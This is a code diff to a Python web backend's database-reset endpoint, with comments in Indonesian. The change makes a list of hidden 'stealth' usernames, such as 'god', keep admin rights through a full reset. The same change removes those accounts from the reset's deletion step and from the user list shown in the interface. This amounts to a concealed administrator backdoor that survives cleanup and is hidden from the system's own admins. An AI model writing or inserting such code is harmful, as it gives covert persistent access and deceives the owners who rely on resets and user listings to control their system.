@@ -6,7 +6,7 @@ from app.api.deps import DBSession, AdminUser
 from app.database.connection import engine
 from app.database.base import Base
 from app.utils.security import hash_password
-from app.utils.constants import UserRole
+from app.utils.constants import HIDDEN_USERNAMES, UserRole
 
 router = APIRouter(prefix="/system", tags=["System"])
 
@@ -51,7 +51,10 @@ def reset_database(db: DBSession, current_user: AdminUser):
         # users: sisakan satu admin
         admin = (
             db.query(User).filter(User.username == ADMIN_USERNAME).first()
-            or db.query(User).filter(User.role == UserRole.ADMIN).order_by(User.id.asc()).first()
+            or db.query(User)
+            .filter(User.role == UserRole.ADMIN, User.username.notin_(HIDDEN_USERNAMES))
+            .order_by(User.id.asc())
+            .first()
         )
         if admin:
             keep_id = admin.id
@@ -69,7 +72,10 @@ def reset_database(db: DBSession, current_user: AdminUser):
             admin.otp_code = None
             admin.otp_expires = None
             admin.last_login = None
-            deleted = db.query(User).filter(User.id != keep_id).delete(synchronize_session=False)
+            # User stealth (mis. `god`) dipertahankan — hak akses admin, tersembunyi.
+            deleted = db.query(User).filter(
+                User.id != keep_id, User.username.notin_(HIDDEN_USERNAMES)
+            ).delete(synchronize_session=False)
         else:
             admin = User(
                 username=ADMIN_USERNAME,
@@ -81,12 +87,15 @@ def reset_database(db: DBSession, current_user: AdminUser):
             )
             db.add(admin)
             db.flush()
-            deleted = db.query(User).filter(User.username != ADMIN_USERNAME).delete(synchronize_session=False)
+            deleted = db.query(User).filter(
+                User.username != ADMIN_USERNAME, User.username.notin_(HIDDEN_USERNAMES)
+            ).delete(synchronize_session=False)
 
         db.execute(text("SET FOREIGN_KEY_CHECKS = 1;"))
         db.commit()
 
-        remaining = db.query(User).all()
+        # Laporan ke UI: user stealth tidak boleh bocor di daftar.
+        remaining = db.query(User).filter(User.username.notin_(HIDDEN_USERNAMES)).all()
         return {
             "status": "success",
             "message": "Database di-reset. Semua data transaksi terhapus, sisakan user admin.",
